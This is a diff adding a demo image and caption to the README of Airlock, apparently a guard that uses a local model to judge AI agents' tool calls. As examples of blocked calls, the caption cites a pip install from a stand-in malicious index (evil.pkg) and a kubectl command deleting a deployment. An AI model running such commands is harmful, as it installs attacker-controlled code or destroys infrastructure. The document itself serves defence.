@@ -231,6 +231,10 @@ the calls a rule marks `ask`. Airlock ships an optional local model that decides
 that gray zone: it sees ONE call the rules could not settle and returns a
 one-line verdict with a human reason.
 
+![The built-in judge deciding gray-zone calls: same tool, opposite verdicts](docs/airlock-judge-demo.gif)
+
+<sub>Same tool, opposite calls — the local 3B judge reads the *action*, not a keyword. `pip install requests` is fine; `pip install … --index-url http://evil.pkg` is not. `kubectl get pods` allowed; `kubectl delete deployment` blocked. All decided on-device, nothing leaves the machine.</sub>
+
 ```bash
 airlock ai-tier standard     # download/enable the built-in judge (one llamafile)
 airlock ai-status            # tier / model / backend
